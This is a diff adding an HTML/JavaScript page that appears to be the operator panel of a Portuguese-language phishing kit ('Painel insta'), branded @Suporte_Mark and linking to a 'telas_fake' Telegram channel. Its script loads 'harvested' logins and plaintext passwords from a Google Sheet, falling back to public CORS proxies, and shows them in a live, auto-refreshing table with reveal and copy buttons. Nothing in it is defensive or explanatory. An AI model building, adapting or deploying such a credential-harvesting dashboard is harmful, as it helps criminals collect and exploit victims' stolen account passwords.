@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Painel - @Suporte_Mark</title>
+  <link rel="icon" href="favicon.webp" type="image/webp">
+  <style>
+    :root { --primary:#2563eb; --primary-dark:#1d4ed8; --secondary:#10b981; --danger:#ef4444; --dark:#1e293b; --light:#f8fafc; --gray:#64748b; --border:#e2e8f0; --shadow:0 4px 6px -1px rgb(0 0 0 / 0.1); --radius:12px; }
+    * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',system-ui,sans-serif; }
+    body { background:linear-gradient(135deg,#f1f5f9,#e2e8f0); color:var(--dark); min-height:100vh; padding-bottom:80px; }
+    
+    /* Header */
+    header { background:linear-gradient(135deg,var(--primary),var(--primary-dark)); color:white; padding:1rem 2rem; display:flex; justify-content:space-between; align-items:center; box-shadow:var(--shadow); position:sticky; top:0; z-index:100; }
+    .logo { display:flex; align-items:center; gap:0.75rem; font-weight:700; font-size:1.25rem; }
+    .logo-icon { width:36px; height:36px; background:white; border-radius:8px; display:grid; place-items:center; color:var(--primary); font-weight:800; }
+    .user-section { display:flex; align-items:center; gap:1rem; }
+    .user-badge { background:rgba(255,255,255,0.15); padding:0.5rem 1rem; border-radius:20px; display:flex; align-items:center; gap:0.5rem; font-size:0.9rem; }
+    .telegram-btn { background:#0088cc; color:white; border:none; padding:0.6rem 1.2rem; border-radius:8px; display:flex; align-items:center; gap:0.5rem; font-weight:600; text-decoration:none; transition:all 0.2s; cursor:pointer; }
+    .telegram-btn:hover { background:#0077b5; transform:translateY(-1px); }
+    .telegram-btn svg, .user-badge svg { width:18px; height:18px; }
+
+    /* Main */
+    main { max-width:1200px; margin:2rem auto; padding:0 1.5rem; }
+    .panel-header { background:white; padding:1.5rem; border-radius:var(--radius); box-shadow:var(--shadow); margin-bottom:1.5rem; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:1rem; }
+    .panel-title h2 { font-size:1.5rem; margin-bottom:0.25rem; }
+    .panel-title p { color:var(--gray); font-size:0.95rem; }
+    .stats { display:flex; gap:1.5rem; flex-wrap:wrap; }
+    .stat-card { background:var(--light); padding:0.75rem 1.25rem; border-radius:8px; text-align:center; min-width:100px; }
+    .stat-card .number { font-size:1.5rem; font-weight:700; color:var(--primary); }
+    .stat-card .label { font-size:0.8rem; color:var(--gray); }
+
+    /* Table */
+    .table-container { background:white; border-radius:var(--radius); box-shadow:var(--shadow); overflow:hidden; }
+    .table-header { padding:1rem 1.5rem; border-bottom:1px solid var(--border); display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:1rem; }
+    .table-title { font-weight:600; }
+    .refresh-btn { background:var(--secondary); color:white; border:none; padding:0.5rem 1rem; border-radius:6px; display:flex; align-items:center; gap:0.5rem; cursor:pointer; font-size:0.9rem; }
+    .refresh-btn:hover { background:#059669; }
+    .table-wrapper { overflow-x:auto; max-height:500px; overflow-y:auto; }
+    table { width:100%; border-collapse:collapse; font-size:0.95rem; }
+    thead { background:var(--dark); color:white; position:sticky; top:0; z-index:10; }
+    th, td { padding:1rem 1.25rem; text-align:left; border-bottom:1px solid var(--border); }
+    th { font-weight:600; white-space:nowrap; cursor:pointer; user-select:none; }
+    th:hover { background:rgba(255,255,255,0.1); }
+    tbody tr:hover { background:#f8fafc; }
+    
+    /* Badge */
+    .badge { padding:0.25rem 0.75rem; border-radius:20px; font-size:0.8rem; font-weight:500; display:inline-block; }
+    .badge-mobile { background:#dbeafe; color:#1e40af; }
+    .badge-desktop { background:#dcfce7; color:#166534; }
+    .badge-login { background:#fef3c7; color:#92400e; }
+    .timestamp { color:var(--gray); font-size:0.85rem; }
+    
+    /* Password Field */
+    .password-field { display:flex; align-items:center; gap:0.5rem; background:#f1f5f9; padding:0.35rem 0.6rem; border-radius:6px; font-family:'Consolas','Monaco',monospace; font-size:0.85em; max-width:200px; }
+    .password-text { flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
+    .password-text.hidden { filter:blur(4px); user-select:none; }
+    .password-toggle { background:none; border:none; cursor:pointer; padding:0.25rem; border-radius:4px; display:grid; place-items:center; transition:background 0.2s; }
+    .password-toggle:hover { background:rgba(0,0,0,0.1); }
+    .password-toggle svg { width:14px; height:14px; color:var(--gray); }
+    
+    /* Copy Button */
+    .copy-btn { background:none; border:none; cursor:pointer; padding:0.25rem; border-radius:4px; display:grid; place-items:center; transition:all 0.2s; }
+    .copy-btn:hover { background:rgba(37,99,235,0.1); }
+    .copy-btn svg { width:14px; height:14px; color:var(--primary); }
+    .copy-btn.copied svg { color:var(--secondary); }
+    
+    /* Empty/Loading */
+    .empty-state, .loading { padding:3rem; text-align:center; color:var(--gray); display:flex; justify-content:center; align-items:center; flex-direction:column; gap:1rem; }
+    .spinner { width:24px; height:24px; border:3px solid var(--border); border-top-color:var(--primary); border-radius:50%; animation:spin 1s linear infinite; }
+    @keyframes spin { to { transform:rotate(360deg); } }
+
+    /* Footer */
+    footer { position:fixed; bottom:0; left:0; right:0; background:white; border-top:1px solid var(--border); padding:1rem 2rem; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:1rem; box-shadow:0 -2px 10px rgba(0,0,0,0.05); }
+    .footer-brand { font-size:0.9rem; color:var(--gray); }
+    .footer-brand strong { color:var(--dark); }
+    .footer-links { display:flex; gap:1rem; flex-wrap:wrap; }
+    .footer-link { color:var(--primary); text-decoration:none; font-weight:500; display:flex; align-items:center; gap:0.35rem; }
+    .footer-link:hover { color:var(--primary-dark); text-decoration:underline; }
+    .footer-link svg { width:16px; height:16px; }
+
+    /* Toast Notification */
+    .toast { position:fixed; bottom:80px; right:20px; background:var(--dark); color:white; padding:0.75rem 1.25rem; border-radius:8px; display:flex; align-items:center; gap:0.5rem; box-shadow:var(--shadow); transform:translateY(100px); opacity:0; transition:all 0.3s; z-index:1000; }
+    .toast.show { transform:translateY(0); opacity:1; }
+    .toast svg { width:18px; height:18px; color:var(--secondary); }
+
+    /* Responsive */
+    @media(max-width:768px) {
+      header { flex-direction:column; gap:1rem; padding:1rem; }
+      .panel-header { flex-direction:column; align-items:flex-start; }
+      .stats { width:100%; justify-content:space-around; }
+      footer { flex-direction:column; text-align:center; padding:1rem; }
+      th, td { padding:0.75rem 1rem; font-size:0.85rem; }
+      .password-field { max-width:150px; }
+    }
+
+    /* Sort indicator */
+    .sort-indicator { margin-left:0.35rem; opacity:0.6; font-size:0.8rem; }
+    th.sorted .sort-indicator { opacity:1; color:var(--secondary); }
+  </style>
+</head>
+<body>
+
+  <!-- Header -->
+  <header>
+    <div class="logo"><div class="logo-icon">📊</div><span>Painel insta versão 3.9</div>
+    <div class="user-section">
+      <div class="user-badge">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+        <strong>@Suporte_Mark</strong>
+      </div>
+      <a href="https://t.me/Suporte_Mark" target="_blank" class="telegram-btn">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M11.944 17.97L4.58 13.22l-.03-.02c-.39-.24-.58-.72-.43-1.15.15-.43.6-.7 1.05-.64l8.25 1.18 3.73-7.77c.21-.44.72-.64 1.16-.43.44.21.64.72.43 1.16l-4.12 8.59a1 1 0 0 1-.88.56h-.02l-1.78-.23z"/></svg>
+        Telegram
+      </a>
+    </div>
+  </header>
+
+  <!-- Main Content -->
+  <main>
+    <div class="panel-header">
+      <div class="panel-title">
+        <h2>📋 PAINEL OFICIAL MARK</h2>
+        <p>DADOS EM TEMPO REAL ABAIXO</p>
+      </div>
+      <div class="stats">
+        <div class="stat-card"><div class="number" id="totalEntries">0</div><div class="label">Registros</div></div>
+        <div class="stat-card"><div class="number" id="mobileCount">0</div><div class="label">Mobile</div></div>
+        <div class="stat-card"><div class="number" id="todayCount">0</div><div class="label">Hoje</div></div>
+      </div>
+    </div>
+
+    <div class="table-container">
+      <div class="table-header">
+        <span class="table-title">📄 Dados Colhidos [ Abaixo ]</span>
+        <button class="refresh-btn" onclick="loadData()">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 2v6h-6M3 22v-6h6M13.5 4.928a9 9 0 0 1 5.572 5.572M10.5 19.072a9 9 0 0 1-5.572-5.572"/></svg>
+          Atualizar
+        </button>
+      </div>
+      <div class="table-wrapper">
+        <table id="dataTable">
+          <thead>
+            <tr>
+              <th onclick="sortTable(0)"># <span class="sort-indicator">↕</span></th>
+              <th onclick="sortTable(1)">Registro <span class="sort-indicator">↕</span></th>
+              <th onclick="sortTable(2)">Senha <span class="sort-indicator">↕</span></th>
+              <th onclick="sortTable(3)">Data <span class="sort-indicator">↕</span></th>
+              <th onclick="sortTable(4)">Hora <span class="sort-indicator">↕</span></th>
+            </tr>
+          </thead>
+          <tbody id="tableBody">
+            <tr><td colspan="5" class="loading"><div class="spinner"></div>Carregando dados...</td></tr>
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </main>
+
+  <!-- Footer -->
+  <footer>
+    <div class="footer-brand">Desenvolvido por <strong>@Suporte_Mark</strong></div>
+    <div class="footer-links">
+      <a href="https://t.me/Suporte_Mark" target="_blank" class="footer-link">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M11.944 17.97L4.58 13.22l-.03-.02c-.39-.24-.58-.72-.43-1.15.15-.43.6-.7 1.05-.64l8.25 1.18 3.73-7.77c.21-.44.72-.64 1.16-.43.44.21.64.72.43 1.16l-4.12 8.59a1 1 0 0 1-.88.56h-.02l-1.78-.23z"/></svg>
+        @Suporte_Mark
+      </a>
+      <a href="https://t.me/telas_fake" target="_blank" class="footer-link">
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
+        t.me/telas_fake
+      </a>
+    </div>
+  </footer>
+
+  <!-- Toast Notification -->
+  <div class="toast" id="toast">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6L9 17l-5-5"/></svg>
+    <span>Copiado!</span>
+  </div>
+
+  <script>
+    // ⚙️ CONFIGURAÇÕES - ATUALIZADO COM SUA NOVA PLANILHA
+    const SHEET_ID = '1OD0MzU2W9-H6vRr96Vu_E4OMSKkO56GlW2O7fj9CqJk';
+    const SHEET_GID = '0'; // Altere se sua aba tiver outro GID
+    
+    // URLs de fallback para exportação CSV (sem espaços!)
+    const CSV_URLS = [
+      `https://docs.google.com/spreadsheets/d/${SHEET_ID}/export?format=csv&gid=${SHEET_GID}`,
+      `https://docs.google.com/spreadsheets/d/${SHEET_ID}/export?format=csv&gid=${SHEET_GID}&usp=sharing`,
+      `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://docs.google.com/spreadsheets/d/${SHEET_ID}/export?format=csv&gid=${SHEET_GID}`)}`,
+      `https://corsproxy.io/?${encodeURIComponent(`https://docs.google.com/spreadsheets/d/${SHEET_ID}/export?format=csv&gid=${SHEET_GID}`)}`,
+      `https://cors.isomorphic-git.org/${encodeURIComponent(`https://docs.google.com/spreadsheets/d/${SHEET_ID}/export?format=csv&gid=${SHEET_GID}`)}`
+    ];
+
+    let tableData = [];
+    let sortConfig = { column: 3, direction: 'desc' }; // Ordena por data por padrão
+
+    async function loadData() {
+      const tbody = document.getElementById('tableBody');
+      
+      for (const url of CSV_URLS) {
+        try {
+          const response = await fetch(url, { cache: 'no-store', mode: 'cors' });
+          if (!response.ok) continue;
+          
+          const csvText = await response.text();
+          if (!csvText.trim() || csvText.toLowerCase().includes('permission denied') || csvText.includes('<!DOCTYPE')) continue;
+          
+          tableData = parseCSV(csvText);
+          // Remove cabeçalho se existir
+          if (tableData.length > 0 && tableData[0][0]?.toLowerCase().includes('registro')) {
+            tableData = tableData.slice(1);
+          }
+          
+          updateStats();
+          renderTable();
+          console.log('✅ Dados carregados via:', url);
+          return;
+          
+        } catch (e) {
+          console.warn('⚠️ Falha:', url.substring(0,60)+'...', e.message);
+          continue;
+        }
+      }
+      
+      tbody.innerHTML = `
+        <tr><td colspan="5" style="text-align:center;padding:2rem;color:#ef4444;">
+          ❌ Não foi possível carregar os dados.<br><br>
+          <strong>Verifique:</strong><br>
+          1. Planilha compartilhada como: <em>"Qualquer pessoa com o link pode visualizar"</em><br>
+          2. Link de teste: <a href="https://docs.google.com/spreadsheets/d/${SHEET_ID}/export?format=csv&gid=${SHEET_GID}" target="_blank" style="color:#2563eb;text-decoration:underline;">Clique para testar CSV</a><br><br>
+          <small>ID: ${SHEET_ID}</small>
+        </td></tr>
+      `;
+    }
+
+    function parseCSV(text) {
+      const lines = [], rows = text.split(/\r?\n/);
+      for (const row of rows) {
+        if (!row.trim()) continue;
+        const cells = [];
+        let cell = '', inQuotes = false;
+        for (let i = 0; i < row.length; i++) {
+          const char = row[i];
+          if (char === '"') inQuotes = !inQuotes;
+          else if (char === ',' && !inQuotes) { cells.push(cell.trim()); cell = ''; }
+          else cell += char;
+        }
+        cells.push(cell.trim());
+        lines.push(cells);
+      }
+      return lines.filter(r => r.some(c => c));
+    }
+
+    function renderTable() {
+      const tbody = document.getElementById('tableBody');
+      if (tableData.length === 0) {
+        tbody.innerHTML = `<tr><td colspan="5" class="empty-state">📭 Nenhum registro encontrado</td></tr>`;
+        return;
+      }
+
+      const sorted = [...tableData].sort((a, b) => {
+        const col = sortConfig.column;
+        let valA = a[col] || '', valB = b[col] || '';
+        if (col === 2 || col === 3) { // Data ou Hora
+          valA = new Date(valA).getTime() || 0; 
+          valB = new Date(valB).getTime() || 0; 
+        }
+        if (valA < valB) return sortConfig.direction === 'asc' ? -1 : 1;
+        if (valA > valB) return sortConfig.direction === 'asc' ? 1 : -1;
+        return 0;
+      });
+
+      tbody.innerHTML = sorted.map((row, i) => {
+        // 📌 ORDEM DAS COLUNAS DO SHEETMONKEY:
+        // [0] Registro | [1] passaporte | [2] data | [3] hora
+        const [registro, senha, data, hora] = row;
+        const passwordId = `pwd-${i}`;
+        
+        return `<tr>
+          <td><strong>${i+1}</strong></td>
+          <td title="${escapeHtml(registro)}">${truncate(escapeHtml(registro), 35)}</td>
+          <td>
+            <div class="password-field">
+              <span class="password-text hidden" id="${passwordId}">${escapeHtml(senha)||'-'}</span>
+              <button class="password-toggle" onclick="togglePassword('${passwordId}')" title="Mostrar/Ocultar">
+                <svg class="eye-open" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+                <svg class="eye-closed" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:none;"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>
+              </button>
+              <button class="copy-btn" onclick="copyPassword('${escapeHtml(senha||'')}')" title="Copiar">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+              </button>
+            </div>
+          </td>
+          <td class="timestamp" title="${escapeHtml(data)}">${formatDate(data)}</td>
+          <td><span class="badge badge-login">${escapeHtml(hora)||'-'}</span></td>
+        </tr>`;
+      }).join('');
+    }
+
+    function togglePassword(id) {
+      const text = document.getElementById(id);
+      const btn = text.parentElement.querySelector('.password-toggle');
+      const eyeOpen = btn.querySelector('.eye-open');
+      const eyeClosed = btn.querySelector('.eye-closed');
+      
+      text.classList.toggle('hidden');
+      eyeOpen.style.display = text.classList.contains('hidden') ? '' : 'none';
+      eyeClosed.style.display = text.classList.contains('hidden') ? 'none' : '';
+    }
+
+    function copyPassword(password) {
+      if (!password || password === '-') return;
+      navigator.clipboard.writeText(password).then(() => {
+        const toast = document.getElementById('toast');
+        toast.classList.add('show');
+        setTimeout(() => toast.classList.remove('show'), 2000);
+      }).catch(() => {
+        alert('Senha: ' + password);
+      });
+    }
+
+    function updateStats() {
+      document.getElementById('totalEntries').textContent = tableData.length;
+      // Conta registros com "mobile" no campo Registro (ajuste conforme necessário)
+      document.getElementById('mobileCount').textContent = tableData.filter(r => r[0]?.toLowerCase().includes('mobile')).length;
+      const today = new Date().toISOString().split('T')[0];
+      document.getElementById('todayCount').textContent = tableData.filter(r => r[2]?.startsWith(today)).length;
+    }
+
+    function formatDate(iso) {
+      if (!iso) return '-';
+      const d = new Date(iso);
+      return isNaN(d) ? iso : d.toLocaleString('pt-BR', {day:'2-digit',month:'2-digit',year:'2-digit',hour:'2-digit',minute:'2-digit'});
+    }
+
+    function sortTable(col) {
+      if (sortConfig.column === col) sortConfig.direction = sortConfig.direction === 'asc' ? 'desc' : 'asc';
+      else { sortConfig.column = col; sortConfig.direction = col === 2 || col === 3 ? 'desc' : 'asc'; }
+      document.querySelectorAll('th').forEach((th,i) => {
+        th.classList.remove('sorted');
+        const ind = th.querySelector('.sort-indicator');
+        if (ind) ind.textContent = '↕';
+      });
+      const th = document.querySelectorAll('th')[col];
+      th.classList.add('sorted');
+      const ind = th.querySelector('.sort-indicator');
+      if (ind) ind.textContent = sortConfig.direction === 'asc' ? '↑' : '↓';
+      renderTable();
+    }
+
+    function escapeHtml(t) { const d=document.createElement('div'); d.textContent=t; return d.innerHTML; }
+    function truncate(s,l) { return !s ? '' : s.length>l ? s.substring(0,l)+'...' : s; }
+
+    // Auto-refresh a cada 30 segundos
+    setInterval(loadData, 30000);
+    document.addEventListener('DOMContentLoaded', loadData);
+  </script>
+</body>
+</html>
